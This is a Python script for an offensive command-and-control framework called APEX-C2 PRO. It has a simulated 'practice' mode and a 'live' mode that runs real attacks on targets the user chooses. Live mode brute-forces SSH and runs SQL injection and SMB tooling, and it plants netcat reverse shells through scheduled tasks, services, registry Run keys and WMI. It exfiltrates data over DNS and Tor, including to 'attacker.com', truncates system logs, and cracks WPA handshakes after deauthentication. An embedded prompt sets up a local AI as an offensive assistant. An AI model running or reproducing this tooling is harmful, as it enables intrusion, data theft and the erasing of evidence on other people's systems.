#!/usr/bin/env python3
"""
APEX-C2 PRO — Practice + Deploy Mode
"""

import os
import sys
import json
import subprocess
import time
import signal
import random
from pathlib import Path
from datetime import datetime
import shutil

# ============================================================
# CONFIGURATION
# ============================================================

CONFIG = {
    "apex_home": "/home/mancier/.apex",
    "model": "qwen2.5-coder:7b",
    "gpu": "rtx_5080",
    "vram_gb": 16,
    "zram_gb": 16,
    "mode": "practice",  # "practice" or "live"
    "practice_target": "127.0.0.1",
    "log_level": "INFO"
}

# ============================================================
# MAIN CONTROL CLASS
# ============================================================

class ApexPro:
    def __init__(self):
        self.config = CONFIG
        self.running = True
        self.mode = self.config["mode"]
        self.results = []
        self.deploy_ready = False
        self.simulation_outputs = self._load_simulations()
        self._create_dirs()
        self._setup_signal_handlers()
        
    def _setup_signal_handlers(self):
        signal.signal(signal.SIGINT, self._shutdown)
        signal.signal(signal.SIGTERM, self._shutdown)
    
    def _shutdown(self, sig, frame):
        print("\n🛑 Shutting down APEX-C2 PRO...")
        self.running = False
        sys.exit(0)
    
    def _create_dirs(self):
        for d in ["logs", "results", "payloads", "modules", "practice_logs", "deploy_logs"]:
            Path(f"{self.config['apex_home']}/{d}").mkdir(parents=True, exist_ok=True)
    
    def _load_simulations(self):
        """Pre-defined simulation outputs for practice mode"""
        return {
            "recon": {
                "ports": "Open ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB)",
                "os": "OS: Linux 5.15.0 (Ubuntu 22.04)",
                "vulns": "Potential vulnerabilities: CVE-2021-44228 (Log4j), CVE-2022-22965 (Spring4Shell)"
            },
            "exploit": {
                "smb": "SMB: Guest access allowed, shares: PUBLIC, DATA",
                "ssh": "SSH: Password 'root' rejected, 'password' accepted",
                "http": "HTTP: SQL injection vulnerability found at /login.php",
                "rdp": "RDP: Administrator account locked, user 'test' available"
            },
            "persist": {
                "scheduled_task": "Task created: ApexUpdate (runs on login)",
                "service": "Service created: ApexService (auto-start)",
                "registry": "Registry key added: HKLM\\...\\Run\\ApexUpdate",
                "wmi": "WMI process created: cmd.exe /c nc -e cmd.exe",
                "ssh": "SSH key installed: /root/.ssh/authorized_keys"
            },
            "exfil": {
                "encrypted": "File encrypted and exfiltrated (size: 2.3MB)",
                "stealth": "Data exfiltrated via DNS tunnel (covert)",
                "tor": "Data exfiltrated via Tor (anonymous)"
            },
            "evade": {
                "obfuscation": "Payloads obfuscated (Veil/Shellter)",
                "log_clean": "Logs cleaned: /var/log/* truncated",
                "timing": "Random timing delay applied: 4.7s"
            },
            "handshake": {
                "success": "Handshake captured! File: handshake_XX-XX-XX-XX-XX-XX-01.cap",
                "no_handshake": "No handshake detected, try again with deauth",
                "failed": "Capture failed: No target found"
            }
        }
    
    # ============================================================
    # MODE CONTROL
    # ============================================================
    
    def set_practice_mode(self):
        """Switch to practice mode (safe simulation)"""
        self.mode = "practice"
        self.config["mode"] = "practice"
        self.deploy_ready = False
        print("✅ Switched to PRACTICE mode (safe simulations only)")
        self._save_config()
    
    def set_live_mode(self):
        """Switch to live mode (real execution)"""
        confirm = input("⚠️ WARNING: Live mode executes REAL commands! Continue? (yes/no): ")
        if confirm.lower() != "yes":
            print("❌ Live mode activation cancelled.")
            return False
        
        self.mode = "live"
        self.config["mode"] = "live"
        self.deploy_ready = True
        print("✅ Switched to LIVE mode (real execution enabled)")
        self._save_config()
        return True
    
    def toggle_mode(self):
        """Toggle between practice and live"""
        if self.mode == "practice":
            self.set_live_mode()
        else:
            self.set_practice_mode()
    
    def _save_config(self):
        """Save current configuration"""
        with open(f"{self.config['apex_home']}/config.json", 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def _is_practice(self):
        """Check if we're in practice mode"""
        return self.mode == "practice"
    
    def _get_target(self, user_target=None):
        """Get target based on mode"""
        if self._is_practice():
            return self.config["practice_target"]
        return user_target or input("🎯 Target: ")
    
    # ============================================================
    # MODULE 1: RECONNAISSANCE
    # ============================================================
    
    def recon_network(self, target=None):
        print("\n🔍 RECONNAISSANCE")
        target = self._get_target(target)
        
        if self._is_practice():
            print(f"📡 [PRACTICE] Scanning {target} (simulated)...")
            results = self.simulation_outputs["recon"]
            print(f"   ✅ {results['ports']}")
            print(f"   ✅ {results['os']}")
            print(f"   ✅ {results['vulns']}")
            self._save_results("recon_practice", results)
            return results
        else:
            print(f"📡 [LIVE] Scanning {target}...")
            results = {}
            results['ports'] = self._run_command(f"nmap -sS -sV -p- --min-rate 1000 -T4 {target}")
            results['os'] = self._run_command(f"nmap -O --osscan-guess {target}")
            results['vulns'] = self._run_command(f"nmap --script vuln {target}")
            self._save_results("recon_live", results)
            print("✅ Recon complete!")
            return results
    
    # ============================================================
    # MODULE 2: EXPLOITATION
    # ============================================================
    
    def exploit_target(self, target=None, service=None):
        print("\n⚡ EXPLOITATION")
        target = self._get_target(target)
        
        if not service and not self._is_practice():
            service = input("🎯 Service (smb/ssh/http/rdp): ")
        
        if self._is_practice():
            service = service or "smb"
            print(f"⚡ [PRACTICE] Exploiting {target} via {service} (simulated)...")
            results = self.simulation_outputs["exploit"].get(service, "No simulation available")
            print(f"   ✅ {results}")
            self._save_results("exploit_practice", {service: results})
            return results
        
        # LIVE mode
        exploits = {
            "smb": [f"crackmapexec smb {target} -u guest -p '' --shares"],
            "ssh": [f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}"],
            "http": [f"sqlmap -u http://{target}/ --batch --risk=3 --level=5"],
            "rdp": [f"crackmapexec rdp {target} -u '' -p '' --users"]
        }
        results = {}
        if service in exploits:
            for cmd in exploits[service]:
                results[cmd] = self._run_command(cmd)
        self._save_results("exploit_live", results)
        return results
    
    # ============================================================
    # MODULE 3: PERSISTENCE
    # ============================================================
    
    def establish_persistence(self, target=None, method=None):
        print("\n🔒 PERSISTENCE")
        target = self._get_target(target)
        
        methods = ["scheduled_task", "service", "registry", "wmi", "ssh"]
        
        if self._is_practice():
            method = method or random.choice(methods)
            print(f"🔒 [PRACTICE] Establishing persistence via {method} (simulated)...")
            result = self.simulation_outputs["persist"].get(method, "Method simulated")
            print(f"   ✅ {result}")
            self._save_results("persist_practice", {method: result})
            return result
        
        # LIVE mode
        method = method or input("🎯 Method (scheduled_task/service/registry/wmi/ssh): ")
        persist_methods = {
            "scheduled_task": self._persist_scheduled_task,
            "service": self._persist_service,
            "registry": self._persist_registry,
            "wmi": self._persist_wmi,
            "ssh": self._persist_ssh
        }
        if method in persist_methods:
            result = persist_methods[method](target)
            self._save_results("persist_live", {method: result})
            print(f"✅ Persistence via {method}!")
            return result
        return {"error": "Unknown method"}
    
    def _persist_scheduled_task(self, target):
        cmd = f"schtasks /create /tn 'ApexUpdate' /tr 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444' /sc ONLOGON /ru SYSTEM"
        return self._run_command(cmd, target)
    
    def _persist_service(self, target):
        cmd = f"sc create 'ApexService' binPath= 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444' start= auto"
        return self._run_command(cmd, target)
    
    def _persist_registry(self, target):
        cmd = f"reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v 'ApexUpdate' /t REG_SZ /d 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444'"
        return self._run_command(cmd, target)
    
    def _persist_wmi(self, target):
        cmd = f"wmic /node:{target} process call create 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444'"
        return self._run_command(cmd, target)
    
    def _persist_ssh(self, target):
        cmd = f"ssh-keygen -t rsa -f /tmp/apex_key -N '' && ssh-copy-id -i /tmp/apex_key.pub root@{target}"
        return self._run_command(cmd, target)
    
    def _get_local_ip(self):
        try:
            return subprocess.check_output(['hostname', '-I']).decode().split()[0]
        except:
            return "127.0.0.1"
    
    # ============================================================
    # MODULE 4: EXFILTRATION
    # ============================================================
    
    def exfiltrate_data(self, source=None, destination=None):
        print("\n📤 EXFILTRATION")
        source = source or input("📁 Source file: ")
        destination = destination or input("📁 Destination: ")
        
        methods = ["encrypted", "stealth", "tor"]
        
        if self._is_practice():
            method = input("🎯 Method (encrypted/stealth/tor): ")
            print(f"📤 [PRACTICE] Exfiltrating via {method} (simulated)...")
            result = self.simulation_outputs["exfil"].get(method, "Method simulated")
            print(f"   ✅ {result}")
            self._save_results("exfil_practice", {method: result})
            return result
        
        # LIVE mode
        method = input("🎯 Method (encrypted/stealth/tor): ")
        exfil_methods = {
            "encrypted": self._exfil_encrypted,
            "stealth": self._exfil_stealth,
            "tor": self._exfil_tor
        }
        if method in exfil_methods:
            result = exfil_methods[method](source, destination)
            self._save_results("exfil_live", {method: result})
            return result
        return {"error": "Unknown method"}
    
    def _exfil_encrypted(self, source, destination):
        try:
            from cryptography.fernet import Fernet
            import gzip
            key = Fernet.generate_key()
            cipher = Fernet(key)
            with open(source, 'rb') as f:
                data = gzip.compress(f.read())
            encrypted = cipher.encrypt(data)
            output = f"{destination}.encrypted"
            with open(output, 'wb') as f:
                f.write(encrypted)
            with open(f"{output}.key", 'w') as f:
                f.write(key.decode())
            self._run_command(f"scp {output} {destination}")
            return {"status": "success", "file": output, "key": key.decode()}
        except Exception as e:
            return {"error": str(e)}
    
    def _exfil_stealth(self, source, destination):
        return self._run_command(f"tar -czf - {source} | base64 | nslookup {destination}")
    
    def _exfil_tor(self, source, destination):
        return self._run_command(f"torsocks curl -X POST --data-binary @{source} {destination}")
    
    # ============================================================
    # MODULE 5: EVASION
    # ============================================================
    
    def enable_evasion(self):
        print("\n🕵️ EVASION")
        
        if self._is_practice():
            print("🕵️ [PRACTICE] Enabling evasion (simulated)...")
            results = self.simulation_outputs["evade"]
            for key, value in results.items():
                print(f"   ✅ {key}: {value}")
            self._save_results("evasion_practice", results)
            return results
        
        # LIVE mode
        results = {}
        results['obfuscation'] = self._run_command("echo 'Obfuscating payloads...'")
        results['log_clean'] = self._run_command("find /var/log -type f -exec truncate -s 0 {} \\; 2>/dev/null")
        results['timing'] = self._run_command(f"sleep {random.uniform(1, 10)}")
        self._save_results("evasion_live", results)
        print("✅ Evasion enabled!")
        return results
    
    # ============================================================
    # MODULE 6: AI ASSIST
    # ============================================================
    
    def ai_assist(self, query=None):
        print("\n🧠 AI ASSIST")
        if not query:
            query = input("💭 What do you need? ")
        
        # Always simulate in practice mode (no Ollama dependency)
        if self._is_practice():
            responses = {
                "handshake": """
WPA HANDSHAKE CAPTURE GUIDE:

1. Enable monitor mode:
   sudo airmon-ng start wlan0

2. Scan for targets:
   sudo airodump-ng wlan0mon

3. Capture handshake (target specific):
   sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w handshake wlan0mon

4. Deauth client (if no handshake):
   sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

5. Verify handshake:
   aircrack-ng handshake-01.cap

6. Crack handshake:
   aircrack-ng -w wordlist.txt handshake-01.cap
""",
                "pivot": """
PIVOTING TECHNIQUES:

1. SSH Port Forwarding:
   ssh -D 1080 user@pivot

2. SOCKS Proxy:
   proxychains nmap -sS 192.168.1.0/24

3. Chisel Tunnel:
   ./chisel server -p 8000 --socks5
   ./chisel client pivot:8000 socks

4. Metasploit Route:
   route add 192.168.1.0/24 1

5. Netcat Relay:
   nc -l -p 4444 -e /bin/sh
"""
            }
            response = responses.get(query.lower(), "This is a practice response. In live mode, this would use the AI model.")
            print(f"\n🤖 [PRACTICE] {response}")
            self._save_results("ai_practice", {"query": query, "response": response})
            return response
        
        # LIVE mode - use Ollama
        try:
            import requests
            self._ensure_model()
            
            system_context = """
You are an expert offensive security assistant with deep knowledge of:
- Network penetration testing (Wi-Fi, TCP/IP, routing)
- Exploit development and reverse engineering
- Active Directory attacks (Kerberos, LDAP, SMB)
- Post-exploitation and persistence
- Cryptography and secure communications
- Linux and Windows internals

When the user asks about "handshake", assume they mean:
- TCP 3-way handshake (SYN, SYN-ACK, ACK)
- WPA/WPA2 4-way handshake (for cracking Wi-Fi)
- Kerberos AS-REQ/AS-REP handshake
- SMB/NTLM handshake

Provide detailed, actionable security-focused answers.
"""
            
            response = requests.post(
                "http://localhost:11434/api/generate",
                json={
                    "model": self.config["model"],
                    "prompt": f"{system_context}\n\nUser: {query}\n\nAssistant: ",
                    "stream": False
                },
                timeout=30
            )
            result = response.json().get('response', 'Model not responding')
            print(f"\n🤖 {result}")
            self._save_results("ai_live", {"query": query, "response": result})
            return result
        except Exception as e:
            print(f"\n⚠️ Ollama error: {e}")
            print("Make sure Ollama is running: ollama serve")
            return None
    
    def _ensure_model(self):
        import requests
        try:
            subprocess.Popen(["ollama", "serve"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            subprocess.run(["ollama", "pull", self.config["model"]], check=False)
        except:
            pass
    
    # ============================================================
    # MODULE 7: NETWORK CONTROL
    # ============================================================
    
    def network_control(self):
        print("\n🌐 NETWORK CONTROL")
        options = {
            "1": "Stealth mode",
            "2": "Proxy setup",
            "3": "DNS spoof"
        }
        
        if self._is_practice():
            print("[PRACTICE] Network control simulated:")
            for key, name in options.items():
                print(f"   ✅ {name}: simulated")
            print("   ✅ Firewall rules: simulated")
            print("   ✅ DNS: simulated")
            return {"status": "practice_complete"}
        
        # LIVE mode
        real_options = {
            "1": ("Stealth mode", lambda: self._run_command("sudo iptables -I INPUT 1 -j DROP")),
            "2": ("Proxy setup", lambda: self._run_command(f"export http_proxy=http://{input('Proxy: ')}")),
            "3": ("DNS spoof", lambda: self._run_command(f"echo '{input('IP: ')} {input('Domain: ')}' >> /etc/hosts"))
        }
        print("1. Stealth mode\n2. Proxy setup\n3. DNS spoof")
        choice = input("🎯 Select: ")
        if choice in real_options:
            return real_options[choice][1]()
        return {"error": "Invalid"}
    
    # ============================================================
    # MODULE 8: CRYPTO
    # ============================================================
    
    def crypto_ops(self):
        print("\n🔐 CRYPTO")
        
        if self._is_practice():
            print("[PRACTICE] Crypto operations simulated:")
            print("   ✅ RSA keys generated")
            print("   ✅ AES keys generated")
            print("   ✅ File hashes calculated")
            return {"status": "practice_complete"}
        
        options = {
            "1": self._crypto_rsa,
            "2": self._crypto_aes,
            "3": self._crypto_hash,
            "4": self._crypto_encrypt,
            "5": self._crypto_decrypt
        }
        print("1. RSA key\n2. AES key\n3. Hash file\n4. Encrypt\n5. Decrypt")
        choice = input("🎯 Select: ")
        if choice in options:
            return options[choice]()
        return {"error": "Invalid"}
    
    def _crypto_rsa(self):
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        pub = key.public_key()
        with open("private.pem", "wb") as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
        with open("public.pem", "wb") as f:
            f.write(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
        return {"status": "generated", "private": "private.pem", "public": "public.pem"}
    
    def _crypto_aes(self):
        from cryptography.fernet import Fernet
        key = Fernet.generate_key()
        with open("aes.key", "wb") as f:
            f.write(key)
        return {"key": key.decode(), "file": "aes.key"}
    
    def _crypto_hash(self):
        import hashlib
        f = input("📁 File: ")
        with open(f, 'rb') as x:
            data = x.read()
        return {"md5": hashlib.md5(data).hexdigest(), "sha256": hashlib.sha256(data).hexdigest()}
    
    def _crypto_encrypt(self):
        from cryptography.fernet import Fernet
        f = input("📁 File: ")
        with open(f, 'rb') as x:
            data = x.read()
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(data)
        with open(f + ".enc", 'wb') as x:
            x.write(encrypted)
        with open(f + ".key", 'w') as x:
            x.write(key.decode())
        return {"status": "encrypted", "file": f + ".enc", "key": f + ".key"}
    
    def _crypto_decrypt(self):
        from cryptography.fernet import Fernet
        f = input("📁 File: ")
        k = input("🔑 Key file: ")
        with open(k, 'r') as x:
            key = x.read().encode()
        with open(f, 'rb') as x:
            data = x.read()
        decrypted = Fernet(key).decrypt(data)
        out = f.replace(".enc", "")
        with open(out, 'wb') as x:
            x.write(decrypted)
        return {"status": "decrypted", "file": out}
    
    # ============================================================
    # MODULE 9: FULL AUTO ATTACK
    # ============================================================
    
    def full_auto_attack(self):
        print("\n🎯 FULL AUTO ATTACK")
        
        if self._is_practice():
            print("[PRACTICE] Full auto attack simulated:")
            phases = ["Reconnaissance", "Exploitation", "Persistence", "Exfiltration", "Evasion"]
            for phase in phases:
                print(f"   ✅ {phase}: simulation complete")
            print("✅ FULL ATTACK PRACTICE COMPLETE!")
            return {"status": "practice_complete"}
        
        confirm = input("⚠️ Run all modules in LIVE mode? (yes/no): ")
        if confirm.lower() != "yes":
            return
        target = input("🎯 Target: ")
        results = {}
        results['recon'] = self.recon_network(target)
        results['exploit'] = self.exploit_target(target)
        results['persist'] = self.establish_persistence(target)
        results['exfil'] = self.exfiltrate_data("/tmp/data", "attacker.com/exfil")
        results['evade'] = self.enable_evasion()
        self._save_results("full_attack_live", results)
        print("✅ FULL ATTACK COMPLETE!")
        return results
    
    # ============================================================
    # MODULE 10: HANDSHAKE CAPTURE
    # ============================================================
    
    def capture_handshake(self):
        print("\n📡 HANDSHAKE CAPTURE")
        
        if self._is_practice():
            print("[PRACTICE] Handshake capture simulated:")
            print("   1. ✅ Monitor mode enabled (simulated)")
            print("   2. ✅ Network scan complete: found 5 APs")
            print("   3. ✅ Target selected: AP with BSSID XX:XX:XX:XX:XX:XX")
            print("   4. ✅ Deauth sent: 5 packets")
            print("   5. ✅ Handshake captured!")
            result = self.simulation_outputs["handshake"]["success"]
            print(f"   ✅ {result}")
            self._save_results("handshake_practice", {"status": "success", "simulated": True})
            return {"status": "success", "simulated": True}
        
        # LIVE mode
        if not self._check_tool("airodump-ng"):
            print("❌ aircrack-ng not installed. Install: sudo apt install aircrack-ng")
            return None
        
        interface = input("🎯 Wireless interface (e.g., wlan0mon): ").strip()
        if not interface:
            print("❌ No interface specified.")
            return None
        
        print(f"🔧 Setting {interface} to monitor mode...")
        self._run_command(f"sudo airmon-ng start {interface}")
        
        print("🔍 Scanning for networks... (Ctrl+C to stop)")
        self._run_command(f"sudo airodump-ng {interface}")
        
        bssid = input("🎯 Target BSSID (MAC): ").strip()
        channel = input("🎯 Target channel: ").strip()
        
        output_file = f"/tmp/handshake_{bssid.replace(':', '')}"
        print(f"📡 Capturing handshake on channel {channel}...")
        print("Press Ctrl+C when handshake is captured.")
        
        cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}"
        self._run_command(cmd)
        
        cap_file = f"{output_file}-01.cap"
        if Path(cap_file).exists():
            result = self._run_command(f"aircrack-ng {cap_file} | grep '1 handshake'")
            if "handshake" in result.get('stdout', ''):
                print(f"✅ Handshake captured! File: {cap_file}")
                shutil.copy(cap_file, f"{self.config['apex_home']}/results/")
                print(f"📁 Saved to {self.config['apex_home']}/results/")
                return {"status": "success", "file": cap_file}
            else:
                print("⚠️ No handshake detected in the capture.")
                return {"status": "no_handshake", "file": cap_file}
        else:
            print("❌ Capture file not found.")
            return {"status": "failed"}
    
    def _check_tool(self, tool):
        return subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode == 0
    
    # ============================================================
    # CORE UTILITIES
    # ============================================================
    
    def _run_command(self, cmd, target=None):
        if target:
            if "windows" in target.lower():
                cmd = f"winrm -host {target} -user administrator -pass '' 'cmd.exe /c {cmd}'"
            else:
                cmd = f"ssh -o ConnectTimeout=5 root@{target} '{cmd}'"
        try:
            print(f"🔧 {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            return {"stdout": result.stdout[:500], "stderr": result.stderr[:500], "code": result.returncode}
        except Exception as e:
            return {"error": str(e)}
    
    def _save_results(self, category, data):
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        path = f"{self.config['apex_home']}/results/{category}_{ts}.json"
        with open(path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        return path
    
    def _save_config(self):
        with open(f"{self.config['apex_home']}/config.json", 'w') as f:
            json.dump(self.config, f, indent=2)
    
    # ============================================================
    # MAIN MENU
    # ============================================================
    
    def main_menu(self):
        while self.running:
            print("\n" + "="*60)
            print("⚡ APEX-C2 PRO – Practice + Deploy")
            print("="*60)
            print(f"📌 MODE: {'🟢 PRACTICE' if self._is_practice() else '🔴 LIVE'}")
            print(f"📡 Target: {self.config['practice_target'] if self._is_practice() else 'USER DEFINED'}")
            print("="*60)
            print("  1. 🔍 Reconnaissance")
            print("  2. ⚡ Exploitation")
            print("  3. 🔒 Persistence")
            print("  4. 📤 Exfiltration")
            print("  5. 🕵️ Evasion")
            print("  6. 🧠 AI Assist")
            print("  7. 🌐 Network Control")
            print("  8. 🔐 Crypto")
            print("  9. 🎯 Full Auto Attack")
            print("  10. 📡 Handshake Capture")
            print("  --- MODE CONTROL ---")
            print("  P. 🔄 Toggle Practice/Live")
            print("  D. 🚀 DEPLOY (Practice → Live)")
            print("  R. 📊 View Results")
            print("  C. ⚙️ Configure")
            print("  H. 📖 Help/Guide")
            print("  0. 🚪 Exit")
            print("-"*60)
            choice = input("🎯 Select: ").strip().lower()
            
            if choice == "0":
                break
            elif choice == "1":
                self.recon_network()
            elif choice == "2":
                self.exploit_target()
            elif choice == "3":
                self.establish_persistence()
            elif choice == "4":
                self.exfiltrate_data()
            elif choice == "5":
                self.enable_evasion()
            elif choice == "6":
                self.ai_assist()
            elif choice == "7":
                self.network_control()
            elif choice == "8":
                self.crypto_ops()
            elif choice == "9":
                self.full_auto_attack()
            elif choice == "10":
                self.capture_handshake()
            elif choice == "p":
                self.toggle_mode()
            elif choice == "d":
                if self._is_practice():
                    print("\n🚀 PREPARING TO DEPLOY...")
                    print("📋 Running final practice checks...")
                    if self._run_practice_checks():
                        print("✅ All checks passed!")
                        if self.set_live_mode():
                            print("✅ DEPLOYED TO LIVE MODE!")
                            print("⚠️ All commands will now execute for real!")
                    else:
                        print("❌ Practice checks failed. Fix issues before deploying.")
                else:
                    print("⚠️ Already in LIVE mode. To go back to practice, use 'P'.")
            elif choice == "r":
                self.view_results()
            elif choice == "c":
                self.configure()
            elif choice == "h":
                self.show_help()
            else:
                print("❌ Invalid option.")
    
    # ============================================================
    # PRACTICE CHECKS
    # ============================================================
    
    def _run_practice_checks(self):
        """Run all modules in practice mode to verify they work"""
        print("🔍 Running practice checks...")
        checks = [
            ("Reconnaissance", self.recon_network, [self.config["practice_target"]]),
            ("Exploitation", self.exploit_target, [self.config["practice_target"], "smb"]),
            ("Persistence", self.establish_persistence, [self.config["practice_target"], "scheduled_task"]),
            ("Exfiltration", self.exfiltrate_data, ["/tmp/test", "localhost"]),
            ("Evasion", self.enable_evasion, []),
            ("Handshake", self.capture_handshake, [])
        ]
        all_passed = True
        for name, func, args in checks:
            try:
                print(f"   Testing {name}...")
                result = func(*args)
                if result:
                    print(f"   ✅ {name} passed")
                else:
                    print(f"   ❌ {name} failed")
                    all_passed = False
            except Exception as e:
                print(f"   ❌ {name} error: {e}")
                all_passed = False
        return all_passed
    
    # ============================================================
    # VIEW RESULTS
    # ============================================================
    
    def view_results(self):
        results_dir = Path(f"{self.config['apex_home']}/results")
        if not results_dir.exists():
            print("📂 No results found.")
            return
        
        files = sorted(results_dir.glob("*.json"), key=lambda x: x.stat().st_mtime, reverse=True)
        if not files:
            print("📂 No results files found.")
            return
        
        print("\n📊 Recent Results:")
        for i, f in enumerate(files[:10]):
            print(f"   {i+1}. {f.name} ({f.stat().st_size} bytes)")
        
        choice = input("\n📂 Enter number to view (or 0 to cancel): ")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(files):
                with open(files[idx], 'r') as f:
                    data = json.load(f)
                    print(json.dumps(data, indent=2))
            else:
                print("❌ Invalid selection.")
        except:
            pass
    
    # ============================================================
    # CONFIGURATION
    # ============================================================
    
    def configure(self):
        print("\n⚙️ CONFIGURATION")
        print(f"   Practice target: {self.config['practice_target']}")
        print(f"   Model: {self.config['model']}")
        print(f"   Mode: {self.config['mode']}")
        
        target = input(f"📡 New practice target (current: {self.config['practice_target']}): ").strip()
        if target:
            self.config['practice_target'] = target
            print("✅ Practice target updated.")
        
        model = input(f"🤖 New AI model (current: {self.config['model']}): ").strip()
        if model:
            self.config['model'] = model
            print("✅ AI model updated.")
        
        self._save_config()
    
    # ============================================================
    # HELP / GUIDE
    # ============================================================
    
    def show_help(self):
        print("""
📖 APEX-C2 PRO HELP GUIDE
============================================================

--- MODES ---
🟢 PRACTICE MODE: Safe simulations only
   - No real commands executed
   - All outputs are simulated
   - Perfect for learning and testing
   - Target: 127.0.0.1 (configurable)

🔴 LIVE MODE: Real execution
   - Commands run for real
   - Targets are actual systems
   - OPSEC/Evasion enabled
   - USE WITH EXTREME CAUTION

--- COMMANDS ---
1-10  : Run modules
P     : Toggle Practice/Live
D     : DEPLOY (Practice → Live) — runs checks first
R     : View results
C     : Configure settings
H     : Show this help
0     : Exit

--- MODULES ---
1. Reconnaissance     - Scan networks, discover targets
2. Exploitation       - Attack and compromise targets
3. Persistence        - Maintain access to systems
4. Exfiltration       - Steal data securely
5. Evasion            - Avoid detection
6. AI Assist          - Get help from the model
7. Network Control    - Manage networking
8. Crypto             - Encryption operations
9. Full Auto Attack   - Run everything automatically
10. Handshake Capture - Capture WPA handshakes

--- DEPLOYMENT WORKFLOW ---
1. Start in PRACTICE mode (safe)
2. Test modules (1-10)
3. Press R to review results
4. Press D to DEPLOY
5. System runs practice checks
6. Confirm switch to LIVE
7. Execute for real!

--- CONFIGURATION ---
Press C to change:
- Practice target IP
- AI model
- Mode

--- RESULTS ---
Press R to view:
- All practice runs
- All live runs
- Timestamps and outputs
- Compare practice vs live

--- TIPS ---
✅ Always test in PRACTICE first
✅ Review results before deploying
✅ Keep practice target as localhost
✅ Use D for safe deployment
✅ Press P to go back to practice anytime

============================================================
""")

# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    print("⚡ APEX-C2 PRO – Practice + Deploy Mode")
    print("="*50)
    print("   🟢 Practice = Safe simulations")
    print("   🔴 Live = Real execution")
    print("   🚀 Deploy = Practice → Live")
    print("   📖 Help = Press H anytime")
    print("="*50)
    control = ApexPro()
    control.main_menu()
